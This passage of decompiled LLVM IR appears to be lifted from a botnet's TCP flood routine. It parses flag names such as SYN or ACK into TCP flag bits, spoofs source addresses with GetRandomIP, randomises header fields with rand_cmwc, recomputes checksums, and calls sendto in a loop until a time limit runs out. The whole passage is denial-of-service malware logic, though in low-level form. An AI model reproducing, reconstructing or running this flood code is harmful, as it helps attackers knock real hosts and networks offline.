  %v4_804bac3 = sub nsw i8 %v1_804bac3, %v3_804bac3
  %v15_804bac3 = icmp eq i8 %v4_804bac3, 0
  %v20_804bac3 = zext i8 %v4_804bac3 to i32
  %v23_804bac3 = or i32 %v20_804bac3, %v3_804bac1
  store i32 %v23_804bac3, i32* @ecx, align 4
  %v2_804bac7 = sext i8 %v4_804bac3 to i32
  store i32 %v2_804bac7, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bacc = icmp eq i1 %v15_804bac3, false
  br i1 %v1_804bacc, label %dec_label_pc_804badf, label %dec_label_pc_804bace

dec_label_pc_804bace:                             ; preds = %dec_label_pc_804ba9b
  store i32 %v1_804b956, i32* @eax, align 4
  %v3_804bad1 = load i8, i8* %v2_804bbc4, align 1
  %v4_804bad1 = zext i8 %v3_804bad1 to i32
  %v7_804bad1 = or i32 %v5_804babb, %v4_804bad1
  %v1_804bad4 = or i32 %v7_804bad1, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bad4 = trunc i32 %v1_804bad4 to i8
  store i32 %v1_804bad4, i32* @edx, align 4
  store i8 %v3_804bad4, i8* %v2_804bbc4, align 1
  br label %dec_label_pc_804bbe8

dec_label_pc_804badf:                             ; preds = %dec_label_pc_804ba9b
  store i32 %v4_804ba57, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba57, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564fb.146 to i32), i32* @edi, align 4
  %v6_804bb03 = call i32 @_strncmp(i8* %v3_804bbd7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564fb.146, i32 0, i32 0), i32 4)
  %v7_804bb03 = urem i32 %v6_804bb03, 2
  %v8_804bb03 = icmp eq i32 %v7_804bb03, 0
  %v0_804bb05 = load i1, i1* %cf.global-to-local, align 1
  %v2_804bb05 = or i1 %v0_804bb05, %v8_804bb03
  %v3_804bb05 = zext i1 %v2_804bb05 to i32
  %v4_804bb05 = load i32, i32* %edx.global-to-local, align 4
  %v5_804bb05 = and i32 %v4_804bb05, -256
  %v6_804bb05 = or i32 %v3_804bb05, %v5_804bb05
  %v7_804bb05 = xor i32 %v6_804bb05, 1
  store i32 %v7_804bb05, i32* %edx.global-to-local, align 4
  %v3_804bb0b = and i32 %v6_804bb03, -256
  %v1_804bb0d = trunc i32 %v7_804bb05 to i8
  %v3_804bb0d = zext i1 %v0_804bb05 to i8
  %v4_804bb0d = sub nsw i8 %v1_804bb0d, %v3_804bb0d
  %v15_804bb0d = icmp eq i8 %v4_804bb0d, 0
  %v20_804bb0d = zext i8 %v4_804bb0d to i32
  %v23_804bb0d = or i32 %v20_804bb0d, %v3_804bb0b
  store i32 %v23_804bb0d, i32* @ecx, align 4
  %v2_804bb11 = sext i8 %v4_804bb0d to i32
  store i32 %v2_804bb11, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bb16 = icmp eq i1 %v15_804bb0d, false
  br i1 %v1_804bb16, label %dec_label_pc_804bb29, label %dec_label_pc_804bb18

dec_label_pc_804bb18:                             ; preds = %dec_label_pc_804badf
  store i32 %v1_804b956, i32* @eax, align 4
  %v3_804bb1b = load i8, i8* %v2_804bbc4, align 1
  %v4_804bb1b = zext i8 %v3_804bb1b to i32
  %v7_804bb1b = or i32 %v5_804bb05, %v4_804bb1b
  %v1_804bb1e = or i32 %v7_804bb1b, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bb1e = trunc i32 %v1_804bb1e to i8
  store i32 %v1_804bb1e, i32* @edx, align 4
  store i8 %v3_804bb1e, i8* %v2_804bbc4, align 1
  br label %dec_label_pc_804bbe8

dec_label_pc_804bb29:                             ; preds = %dec_label_pc_804badf
  store i32 %v4_804ba57, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba57, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564ff.147 to i32), i32* @edi, align 4
  %v6_804bb59 = call i32 @_strncmp(i8* %v3_804bbd7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564ff.147, i32 0, i32 0), i32 4)
  %v7_804bb59 = urem i32 %v6_804bb59, 2
  %v8_804bb59 = icmp eq i32 %v7_804bb59, 0
  %v0_804bb5b = load i1, i1* %cf.global-to-local, align 1
  %v2_804bb5b = or i1 %v0_804bb5b, %v8_804bb59
  %v3_804bb5b = zext i1 %v2_804bb5b to i32
  %v4_804bb5b = load i32, i32* %edx.global-to-local, align 4
  %v5_804bb5b = and i32 %v4_804bb5b, -256
  %v6_804bb5b = or i32 %v3_804bb5b, %v5_804bb5b
  %v7_804bb5b = xor i32 %v6_804bb5b, 1
  store i32 %v7_804bb5b, i32* %edx.global-to-local, align 4
  %v3_804bb61 = and i32 %v6_804bb59, -256
  %v1_804bb63 = trunc i32 %v7_804bb5b to i8
  %v3_804bb63 = zext i1 %v0_804bb5b to i8
  %v4_804bb63 = sub nsw i8 %v1_804bb63, %v3_804bb63
  %v15_804bb63 = icmp eq i8 %v4_804bb63, 0
  %v20_804bb63 = zext i8 %v4_804bb63 to i32
  %v23_804bb63 = or i32 %v20_804bb63, %v3_804bb61
  store i32 %v23_804bb63, i32* @ecx, align 4
  %v2_804bb67 = sext i8 %v4_804bb63 to i32
  store i32 %v2_804bb67, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bb6c = icmp eq i1 %v15_804bb63, false
  br i1 %v1_804bb6c, label %dec_label_pc_804bb7c, label %dec_label_pc_804bb6e

dec_label_pc_804bb6e:                             ; preds = %dec_label_pc_804bb29
  store i32 %v1_804b956, i32* @eax, align 4
  %v3_804bb71 = load i8, i8* %v2_804bbc4, align 1
  %v4_804bb71 = zext i8 %v3_804bb71 to i32
  %v7_804bb71 = or i32 %v5_804bb5b, %v4_804bb71
  %v1_804bb74 = or i32 %v7_804bb71, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bb74 = trunc i32 %v1_804bb74 to i8
  store i32 %v1_804bb74, i32* @edx, align 4
  store i8 %v3_804bb74, i8* %v2_804bbc4, align 1
  br label %dec_label_pc_804bbe8

dec_label_pc_804bb7c:                             ; preds = %dec_label_pc_804bb29
  store i32 %v4_804ba57, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba57, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8056503.148 to i32), i32* @edi, align 4
  %v6_804bbac = call i32 @_strncmp(i8* %v3_804bbd7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056503.148, i32 0, i32 0), i32 4)
  %v7_804bbac = urem i32 %v6_804bbac, 2
  %v8_804bbac = icmp eq i32 %v7_804bbac, 0
  %v0_804bbae = load i1, i1* %cf.global-to-local, align 1
  %v2_804bbae = or i1 %v0_804bbae, %v8_804bbac
  %v3_804bbae = zext i1 %v2_804bbae to i32
  %v4_804bbae = load i32, i32* %edx.global-to-local, align 4
  %v5_804bbae = and i32 %v4_804bbae, -256
  %v6_804bbae = or i32 %v3_804bbae, %v5_804bbae
  %v7_804bbae = xor i32 %v6_804bbae, 1
  store i32 %v7_804bbae, i32* %edx.global-to-local, align 4
  %v3_804bbb4 = and i32 %v6_804bbac, -256
  %v1_804bbb6 = trunc i32 %v7_804bbae to i8
  %v3_804bbb6 = zext i1 %v0_804bbae to i8
  %v4_804bbb6 = sub nsw i8 %v1_804bbb6, %v3_804bbb6
  %v15_804bbb6 = icmp eq i8 %v4_804bbb6, 0
  %v20_804bbb6 = zext i8 %v4_804bbb6 to i32
  %v23_804bbb6 = or i32 %v20_804bbb6, %v3_804bbb4
  store i32 %v23_804bbb6, i32* @ecx, align 4
  %v2_804bbba = sext i8 %v4_804bbb6 to i32
  store i32 %v2_804bbba, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804bbbf = icmp eq i1 %v15_804bbb6, false
  br i1 %v1_804bbbf, label %dec_label_pc_804bbcf, label %dec_label_pc_804bbc1

dec_label_pc_804bbc1:                             ; preds = %dec_label_pc_804bb7c
  store i32 %v1_804b956, i32* @eax, align 4
  %v3_804bbc4 = load i8, i8* %v2_804bbc4, align 1
  %v4_804bbc4 = zext i8 %v3_804bbc4 to i32
  %v7_804bbc4 = or i32 %v5_804bbae, %v4_804bbc4
  %v1_804bbc7 = or i32 %v7_804bbc4, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804bbc7 = trunc i32 %v1_804bbc7 to i8
  store i32 %v1_804bbc7, i32* @edx, align 4
  store i8 %v3_804bbc7, i8* %v2_804bbc4, align 1
  br label %dec_label_pc_804bbe8

dec_label_pc_804bbcf:                             ; preds = %dec_label_pc_804bb7c
  %v0_804bbcf = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804bbcf, i32* %eax.global-to-local, align 4
  %v0_804bbd4 = load i32, i32* @esp, align 4
  %v5_804bbd4 = icmp ult i32 %v0_804bbd4, 4
  store i1 %v5_804bbd4, i1* %cf.global-to-local, align 1
  %v6_804bbd7 = add i32 %v0_804bbd4, -8
  %v7_804bbd7 = inttoptr i32 %v6_804bbd7 to i32*
  store i32 %v4_804ba57, i32* %v7_804bbd7, align 4
  %v1_804bbda = add i32 %v0_804bbd4, -12
  %v2_804bbda = inttoptr i32 %v1_804bbda to i32*
  store i32 ptrtoint ([18 x i8]* @global_var_8056507.149 to i32), i32* %v2_804bbda, align 4
  %v0_804bbdf = load i32, i32* %eax.global-to-local, align 4
  %v2_804bbdf = add i32 %v0_804bbd4, -16
  %v3_804bbdf = inttoptr i32 %v2_804bbdf to i32*
  store i32 %v0_804bbdf, i32* %v3_804bbdf, align 4
  %v3_804bbe0 = call i32 @Rootsprintf(i32 4, i32 ptrtoint ([4 x i8]* @global_var_8056503.148 to i32))
  store i32 %v3_804bbe0, i32* @eax, align 4
  %v0_804bbe5 = load i32, i32* @esp, align 4
  %v2_804bbe5 = icmp ugt i32 %v0_804bbe5, -17
  store i1 %v2_804bbe5, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bbe8

dec_label_pc_804bbe8:                             ; preds = %dec_label_pc_804bbc1, %dec_label_pc_804bb6e, %dec_label_pc_804bb18, %dec_label_pc_804bace, %dec_label_pc_804ba8a, %dec_label_pc_804bbcf
  %stack_var_-160.0 = phi i32 [ 4, %dec_label_pc_804bbcf ], [ 4, %dec_label_pc_804bbc1 ], [ %stack_var_-160.130, %dec_label_pc_804bb6e ], [ %stack_var_-160.130, %dec_label_pc_804bb18 ], [ %stack_var_-160.130, %dec_label_pc_804bace ], [ %stack_var_-160.130, %dec_label_pc_804ba8a ]
  %stack_var_-156.0 = phi i8* [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056503.148, i32 0, i32 0), %dec_label_pc_804bbcf ], [ getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8056503.148, i32 0, i32 0), %dec_label_pc_804bbc1 ], [ %stack_var_-156.131, %dec_label_pc_804bb6e ], [ %stack_var_-156.131, %dec_label_pc_804bb18 ], [ %stack_var_-156.131, %dec_label_pc_804bace ], [ %stack_var_-156.131, %dec_label_pc_804ba8a ]
  %v0_804bbe8 = load i32, i32* @esp, align 4
  %v5_804bbe8 = icmp ult i32 %v0_804bbe8, 8
  store i1 %v5_804bbe8, i1* %cf.global-to-local, align 1
  %v1_804bbeb = add i32 %v0_804bbe8, -12
  %v2_804bbeb = inttoptr i32 %v1_804bbeb to i32*
  store i32 ptrtoint (i32* @global_var_80564f1.143 to i32), i32* %v2_804bbeb, align 4
  %v1_804bbf0 = add i32 %v0_804bbe8, -16
  %v2_804bbf0 = inttoptr i32 %v1_804bbf0 to i32*
  store i32 0, i32* %v2_804bbf0, align 4
  %v2_804bbf2 = ptrtoint i8* %stack_var_-156.0 to i32
  %v3_804bbf2 = call i32 @__GI_strtok(i32 %stack_var_-160.0, i32 %v2_804bbf2)
  store i32 %v3_804bbf2, i32* %eax.global-to-local, align 4
  store i32 %v3_804bbf2, i32* %tmp104, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bbfd = icmp eq i32 %v3_804bbf2, 0
  %v1_804bc01 = icmp eq i1 %v5_804bbfd, false
  %tmp105 = inttoptr i32 %v3_804bbf2 to i8*
  br i1 %v1_804bc01, label %dec_label_pc_804ba57, label %dec_label_pc_804bc07

dec_label_pc_804bc07:                             ; preds = %dec_label_pc_804bbe8, %dec_label_pc_804ba3b, %dec_label_pc_804b9fa
  %v0_804bc07 = phi i8* [ %v0_804bc07.pre, %dec_label_pc_804b9fa ], [ %v5_804ba4f, %dec_label_pc_804ba3b ], [ %tmp105, %dec_label_pc_804bbe8 ]
  %v1_804bc07 = ptrtoint i8* %v0_804bc07 to i32
  %v2_804bc07 = call i32 @rand_cmwc(i32 %v1_804bc07)
  %sext9 = mul i32 %v2_804bc07, 65536
  %v1_804bc0c = sdiv i32 %sext9, 65536
  store i32 %v1_804bc0c, i32* %edx.global-to-local, align 4
  %v1_804bc11 = trunc i32 %v1_804bc0c to i16
  %v3_804bc11 = add i32 %v2_804b93e, 34
  %v4_804bc11 = inttoptr i32 %v3_804bc11 to i16*
  store i16 %v1_804bc11, i16* %v4_804bc11, align 2
  %v1_804bc18 = add i32 %v2_804b93e, 36
  %v2_804bc18 = inttoptr i32 %v1_804bc18 to i16*
  store i16 0, i16* %v2_804bc18, align 4
  store i32 %v1_804b956, i32* %eax.global-to-local, align 4
  %v1_804bc21 = add i32 %v2_804b93e, 38
  %v2_804bc21 = inttoptr i32 %v1_804bc21 to i16*
  store i16 0, i16* %v2_804bc21, align 2
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v1_804b82d, label %dec_label_pc_804bc38, label %dec_label_pc_804bc2d

dec_label_pc_804bc2d:                             ; preds = %dec_label_pc_804bc07
  %v0_804bc2d = load i8*, i8** %stack_var_-20, align 4
  %v1_804bc2d = ptrtoint i8* %v0_804bc2d to i32
  %v2_804bc2d = call i32 @rand_cmwc(i32 %v1_804bc2d)
  store i32 %v2_804bc2d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804bc50

dec_label_pc_804bc38:                             ; preds = %dec_label_pc_804bc07
  %v1_804bc3b = urem i32 %arg2, 65536
  store i32 %v1_804bc3b, i32* %eax.global-to-local, align 4
  %v0_804bc40 = load i32, i32* @esp, align 4
  %v5_804bc40 = icmp ult i32 %v0_804bc40, 12
  store i1 %v5_804bc40, i1* %cf.global-to-local, align 1
  %v2_804bc43 = add i32 %v0_804bc40, -16
  %v3_804bc43 = inttoptr i32 %v2_804bc43 to i32*
  store i32 %v1_804bc3b, i32* %v3_804bc43, align 4
  %v1_804bc44 = sext i16 %tmp48 to i32
  %v2_804bc44 = call i32 @htons(i32 %v1_804bc44)
  store i32 %v2_804bc44, i32* %eax.global-to-local, align 4
  %v0_804bc49 = load i32, i32* @esp, align 4
  %v2_804bc49 = icmp ugt i32 %v0_804bc49, -17
  store i1 %v2_804bc49, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bc50

dec_label_pc_804bc50:                             ; preds = %dec_label_pc_804bc2d, %dec_label_pc_804bc38
  %storemerge.in = phi i32 [ %v2_804bc44, %dec_label_pc_804bc38 ], [ %v2_804bc2d, %dec_label_pc_804bc2d ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i32 %v1_804b956, i32* %eax.global-to-local, align 4
  %v4_804bc53 = urem i32 %storemerge.in, 65536
  %v5_804bc53 = load i32, i32* @esi, align 4
  %v6_804bc53 = and i32 %v5_804bc53, -65536
  %v7_804bc53 = or i32 %v6_804bc53, %v4_804bc53
  store i32 %v7_804bc53, i32* @esi, align 4
  %v3_804bc57 = add i32 %v2_804b93e, 22
  %v4_804bc57 = inttoptr i32 %v3_804bc57 to i16*
  store i16 %storemerge, i16* %v4_804bc57, align 2
  %v0_804bc5b = load i32, i32* @esp, align 4
  %v5_804bc5b = icmp ult i32 %v0_804bc5b, 8
  store i1 %v5_804bc5b, i1* %cf.global-to-local, align 1
  %v6_804bc5e = add i32 %v0_804bc5b, -12
  %v7_804bc5e = inttoptr i32 %v6_804bc5e to i32*
  store i32 %v1_804b956, i32* %v7_804bc5e, align 4
  %v5_804bc61 = add i32 %v0_804bc5b, -16
  %v6_804bc61 = inttoptr i32 %v5_804bc61 to i32*
  store i32 %v2_804b93e, i32* %v6_804bc61, align 4
  %v0_804bc64 = call i32 @tcpcsum()
  %v1_804bc64 = trunc i32 %v0_804bc64 to i16
  %sext14 = mul i32 %v0_804bc64, 65536
  %v1_804bc6c = sdiv i32 %sext14, 65536
  store i32 %v1_804bc6c, i32* %edx.global-to-local, align 4
  store i16 %v1_804bc64, i16* %v2_804bc18, align 4
  store i32 %v2_804b93e, i32* %eax.global-to-local, align 4
  %v1_804bc78 = or i32 %v2_804b93e, 2
  %v2_804bc78 = inttoptr i32 %v1_804bc78 to i16*
  %v3_804bc78 = load i16, i16* %v2_804bc78, align 2
  %v4_804bc78 = zext i16 %v3_804bc78 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804bc78, i32* %edx.global-to-local, align 4
  store i32 %v2_804b93e, i32* %eax.global-to-local, align 4
  %v1_804bc87 = load i32, i32* @esp, align 4
  %v2_804bc87 = add i32 %v1_804bc87, -4
  %v3_804bc87 = inttoptr i32 %v2_804bc87 to i32*
  store i32 %v4_804bc78, i32* %v3_804bc87, align 4
  %v0_804bc88 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bc88 = add i32 %v1_804bc87, -8
  %v3_804bc88 = inttoptr i32 %v2_804bc88 to i32*
  store i32 %v0_804bc88, i32* %v3_804bc88, align 4
  %sext15 = mul i32 %storemerge.in, 65536
  %v1_804bc89 = sdiv i32 %sext15, 65536
  %v3_804bc89 = inttoptr i32 %v1_804bc89 to i16*
  %v4_804bc89 = call i32 @csum(i16* %v3_804bc89, i32 ptrtoint (i32* @0 to i32))
  %v5_804bc89 = trunc i32 %v4_804bc89 to i16
  %sext16 = mul i32 %v4_804bc89, 65536
  %v1_804bc91 = sdiv i32 %sext16, 65536
  store i32 %v1_804bc91, i32* %edx.global-to-local, align 4
  store i32 %v2_804b93e, i32* %eax.global-to-local, align 4
  %v3_804bc96 = or i32 %v2_804b93e, 10
  %v4_804bc96 = inttoptr i32 %v3_804bc96 to i16*
  store i16 %v5_804bc89, i16* %v4_804bc96, align 2
  %v0_804bc9a = load i32, i32* @esp, align 4
  %v5_804bc9a = icmp ult i32 %v0_804bc9a, 12
  store i1 %v5_804bc9a, i1* %cf.global-to-local, align 1
  %v1_804bc9d = add i32 %v0_804bc9a, -16
  %v2_804bc9d = inttoptr i32 %v1_804bc9d to i32*
  store i32 0, i32* %v2_804bc9d, align 4
  %v2_804bc9f = inttoptr i32 %v1_804bc89 to i32*
  %v3_804bc9f = call i32 @__GI_time(i32* %v2_804bc9f)
  %v0_804bca4 = load i32, i32* @esp, align 4
  %v1_804bca4 = add i32 %v0_804bca4, 16
  %v5_804bca7 = add i32 %v3_804bc9f, %arg3
  %v10_804bca7 = icmp ult i32 %v5_804bca7, %v3_804bc9f
  store i1 %v10_804bca7, i1* %cf.global-to-local, align 1
  store i32 %v5_804bca7, i32* %eax.global-to-local, align 4
  %v2_804bcf2 = or i32 %v2_804b93e, 12
  %v3_804bcf2 = inttoptr i32 %v2_804bcf2 to i32*
  %v3_804bcff = or i32 %v2_804b93e, 4
  %v4_804bcff = inttoptr i32 %v3_804bcff to i16*
  br label %dec_label_pc_804bcb6

dec_label_pc_804bcb6:                             ; preds = %dec_label_pc_804bd6d, %dec_label_pc_804bd8b, %dec_label_pc_804bc50
  %v0_804bcbc = phi i32 [ %v1_804bca4, %dec_label_pc_804bc50 ], [ %v0_804bcbc.pre.pre, %dec_label_pc_804bd8b ], [ %v1_804bd77, %dec_label_pc_804bd6d ]
  %stack_var_-68.0 = phi i32 [ 0, %dec_label_pc_804bc50 ], [ %v4_804bd8b, %dec_label_pc_804bd8b ], [ 0, %dec_label_pc_804bd6d ]
  store i32 %v2_804b855, i32* %eax.global-to-local, align 4
  store i32 %v2_804b93e, i32* %edx.global-to-local, align 4
  %v5_804bcbc = icmp ult i32 %v0_804bcbc, 8
  store i1 %v5_804bcbc, i1* %cf.global-to-local, align 1
  %v1_804bcbf = add i32 %v0_804bcbc, -12
  %v2_804bcbf = inttoptr i32 %v1_804bcbf to i32*
  store i32 16, i32* %v2_804bcbf, align 4
  %v2_804bcc1 = add i32 %v0_804bcbc, -16
  %v3_804bcc1 = inttoptr i32 %v2_804bcc1 to i32*
  store i32 %v2_804b855, i32* %v3_804bcc1, align 4
  %v1_804bcc2 = add i32 %v0_804bcbc, -20
  %v2_804bcc2 = inttoptr i32 %v1_804bcc2 to i32*
  store i32 0, i32* %v2_804bcc2, align 4
  %v5_804bcc4 = add i32 %v0_804bcbc, -24
  %v6_804bcc4 = inttoptr i32 %v5_804bcc4 to i32*
  store i32 %v1_804b91e, i32* %v6_804bcc4, align 4
  %v0_804bcc7 = load i32, i32* %edx.global-to-local, align 4
  %v2_804bcc7 = add i32 %v0_804bcbc, -28
  %v3_804bcc7 = inttoptr i32 %v2_804bcc7 to i32*
  store i32 %v0_804bcc7, i32* %v3_804bcc7, align 4
  %v5_804bcc8 = add i32 %v0_804bcbc, -32
  %v6_804bcc8 = inttoptr i32 %v5_804bcc8 to i32*
  store i32 %v4_804b88c, i32* %v6_804bcc8, align 4
  %v1_804bccb = load i32, i32* %stack_var_-64, align 4
  %v2_804bccb = load i32, i32* %stack_var_-60, align 4
  %v3_804bccb = load i32, i32* %stack_var_-56, align 4
  %v4_804bccb = load i32, i32* %stack_var_-52, align 4
  %v6_804bccb = call i32 @__libc_sendto(i32 %stack_var_-68.0, i32 %v1_804bccb, i32 %v2_804bccb, i32 %v3_804bccb, i32 %v4_804bccb, i32 0)
  store i32 %v6_804bccb, i32* %eax.global-to-local, align 4
  %v0_804bcd0 = load i32, i32* @esp, align 4
  %v1_804bcd0 = add i32 %v0_804bcd0, 32
  %v5_804bcd3 = icmp ult i32 %v1_804bcd0, 12
  store i1 %v5_804bcd3, i1* %cf.global-to-local, align 1
  %v5_804bcd6 = add i32 %v0_804bcd0, 16
  %v6_804bcd6 = inttoptr i32 %v5_804bcd6 to i32*
  store i32 %storemerge13, i32* %v6_804bcd6, align 4
  %v1_804bcd9 = load i32, i32* %stack_var_-64, align 4
  %v2_804bcd9 = call i32 @GetRandomIP(i32 %stack_var_-68.0, i32 %v1_804bcd9)
  store i32 %v2_804bcd9, i32* %eax.global-to-local, align 4
  %v0_804bcde = load i32, i32* @esp, align 4
  %v1_804bcde = add i32 %v0_804bcde, 16
  %v5_804bce1 = icmp ult i32 %v1_804bcde, 12
  store i1 %v5_804bce1, i1* %cf.global-to-local, align 1
  %v3_804bce4 = inttoptr i32 %v0_804bcde to i32*
  store i32 %v2_804bcd9, i32* %v3_804bce4, align 4
  %v0_804bce5 = call i32 @htonl()
  %v0_804bcea = load i32, i32* @esp, align 4
  %v2_804bcea = icmp ugt i32 %v0_804bcea, -17
  store i1 %v2_804bcea, i1* %cf.global-to-local, align 1
  store i32 %v0_804bce5, i32* %edx.global-to-local, align 4
  store i32 %v2_804b93e, i32* %eax.global-to-local, align 4
  store i32 %v0_804bce5, i32* %v3_804bcf2, align 4
  %v1_804bcf5 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext10 = mul i32 %v1_804bcf5, 65536
  %v1_804bcfa = sdiv i32 %sext10, 65536
  store i32 %v1_804bcfa, i32* %edx.global-to-local, align 4
  store i32 %v2_804b93e, i32* %eax.global-to-local, align 4
  %v1_804bcff = trunc i32 %v1_804bcfa to i16
  store i16 %v1_804bcff, i16* %v4_804bcff, align 4
  %v1_804bd03 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  store i32 %v1_804bd03, i32* %edx.global-to-local, align 4
  store i32 %v1_804b956, i32* %eax.global-to-local, align 4
  store i32 %v1_804bd03, i32* %v3_804b9ab, align 8
  %v1_804bd10 = call i32 @rand_cmwc(i32 %stack_var_-68.0)
  %sext11 = mul i32 %v1_804bd10, 65536
  %v1_804bd15 = sdiv i32 %sext11, 65536
  store i32 %v1_804bd15, i32* %edx.global-to-local, align 4
  %v1_804bd1a = trunc i32 %v1_804bd15 to i16
  store i16 %v1_804bd1a, i16* %v5_804b959, align 4
  store i32 %v1_804b956, i32* %eax.global-to-local, align 4
  store i16 0, i16* %v2_804bc18, align 4
  %v0_804bd26 = load i32, i32* @esp, align 4
  %v5_804bd26 = icmp ult i32 %v0_804bd26, 8
  store i1 %v5_804bd26, i1* %cf.global-to-local, align 1
  %v6_804bd29 = add i32 %v0_804bd26, -12
  %v7_804bd29 = inttoptr i32 %v6_804bd29 to i32*
  store i32 %v1_804b956, i32* %v7_804bd29, align 4
  %v5_804bd2c = add i32 %v0_804bd26, -16
  %v6_804bd2c = inttoptr i32 %v5_804bd2c to i32*
  store i32 %v2_804b93e, i32* %v6_804bd2c, align 4
  %v0_804bd2f = call i32 @tcpcsum()
  %v1_804bd2f = trunc i32 %v0_804bd2f to i16
  %sext18 = mul i32 %v0_804bd2f, 65536
  %v1_804bd37 = sdiv i32 %sext18, 65536
  store i32 %v1_804bd37, i32* %edx.global-to-local, align 4
  store i16 %v1_804bd2f, i16* %v2_804bc18, align 4
  store i32 %v2_804b93e, i32* %eax.global-to-local, align 4
  %v3_804bd43 = load i16, i16* %v2_804bc78, align 2
  %v4_804bd43 = zext i16 %v3_804bd43 to i32
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v4_804bd43, i32* %edx.global-to-local, align 4
  store i32 %v2_804b93e, i32* %eax.global-to-local, align 4
  %v1_804bd52 = load i32, i32* @esp, align 4
  %v2_804bd52 = add i32 %v1_804bd52, -4
  %v3_804bd52 = inttoptr i32 %v2_804bd52 to i32*
  store i32 %v4_804bd43, i32* %v3_804bd52, align 4
  %v0_804bd53 = load i32, i32* %eax.global-to-local, align 4
  %v2_804bd53 = add i32 %v1_804bd52, -8
  %v3_804bd53 = inttoptr i32 %v2_804bd53 to i32*
  store i32 %v0_804bd53, i32* %v3_804bd53, align 4
  %v1_804bd54 = load i32, i32* %stack_var_-64, align 4
  %v2_804bd54 = inttoptr i32 %stack_var_-68.0 to i16*
  %v3_804bd54 = call i32 @csum(i16* %v2_804bd54, i32 %v1_804bd54)
  %v4_804bd54 = trunc i32 %v3_804bd54 to i16
  %sext19 = mul i32 %v3_804bd54, 65536
  %v1_804bd5c = sdiv i32 %sext19, 65536
  store i32 %v1_804bd5c, i32* %edx.global-to-local, align 4
  store i32 %v2_804b93e, i32* %eax.global-to-local, align 4
  store i16 %v4_804bd54, i16* %v4_804bc96, align 2
  store i32 %arg7, i32* @edi, align 4
  %v10_804bd68 = icmp ult i32 %stack_var_-68.0, %arg7
  store i1 %v10_804bd68, i1* %cf.global-to-local, align 1
  %v15_804bd68 = icmp eq i32 %stack_var_-68.0, %arg7
  %v1_804bd6b = icmp eq i1 %v15_804bd68, false
  br i1 %v1_804bd6b, label %dec_label_pc_804bd8b, label %dec_label_pc_804bd6d

dec_label_pc_804bd6d:                             ; preds = %dec_label_pc_804bcb6
  %v0_804bd6d = load i32, i32* @esp, align 4
  %v5_804bd6d = icmp ult i32 %v0_804bd6d, 12
  store i1 %v5_804bd6d, i1* %cf.global-to-local, align 1
  %v1_804bd70 = add i32 %v0_804bd6d, -16
  %v2_804bd70 = inttoptr i32 %v1_804bd70 to i32*
  store i32 0, i32* %v2_804bd70, align 4
  %v1_804bd72 = inttoptr i32 %stack_var_-68.0 to i32*
  %v2_804bd72 = call i32 @__GI_time(i32* %v1_804bd72)
  store i32 %v2_804bd72, i32* %eax.global-to-local, align 4
  %v0_804bd77 = load i32, i32* @esp, align 4
  %v1_804bd77 = add i32 %v0_804bd77, 16
  %v10_804bd7a = icmp ult i32 %v2_804bd72, %v5_804bca7
  store i1 %v10_804bd7a, i1* %cf.global-to-local, align 1
  %v8_804bd7d = icmp sgt i32 %v2_804bd72, %v5_804bca7
  br i1 %v8_804bd7d, label %dec_label_pc_804bd93, label %dec_label_pc_804bcb6

dec_label_pc_804bd8b:                             ; preds = %dec_label_pc_804bcb6
  %v4_804bd8b = add i32 %stack_var_-68.0, 1
  %v0_804bcbc.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804bcb6

dec_label_pc_804bd93:                             ; preds = %dec_label_pc_804bd6d, %dec_label_pc_804b852, %dec_label_pc_804b8db, %dec_label_pc_804b89d
  %v0_804bd9d = phi i32 [ %v4_804b85f, %dec_label_pc_804b852 ], [ %v3_804b8e9, %dec_label_pc_804b8db ], [ %v3_804b8ab, %dec_label_pc_804b89d ], [ %v2_804bd72, %dec_label_pc_804bd6d ]
  store i32 %v0_804b811, i32* @ebx, align 4
  store i32 %v0_804b810, i32* @esi, align 4
  ret i32 %v0_804bd9d

; uselistorder directives
  uselistorder i32 %v2_804bd72, { 0, 2, 1, 3 }
  uselistorder i32 %v1_804bd15, { 1, 0 }
  uselistorder i32 %v1_804bcfa, { 1, 0 }
  uselistorder i32 %v0_804bce5, { 1, 0 }
  uselistorder i32 %stack_var_-68.0, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v0_804bcbc, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v5_804bca7, { 1, 0, 2, 3 }
  uselistorder i32 %v3_804bc9f, { 1, 0 }
  uselistorder i32 %v1_804bc89, { 1, 0 }
  uselistorder i32 %v1_804bc3b, { 1, 0 }
  uselistorder i32 %v1_804bc0c, { 1, 0 }
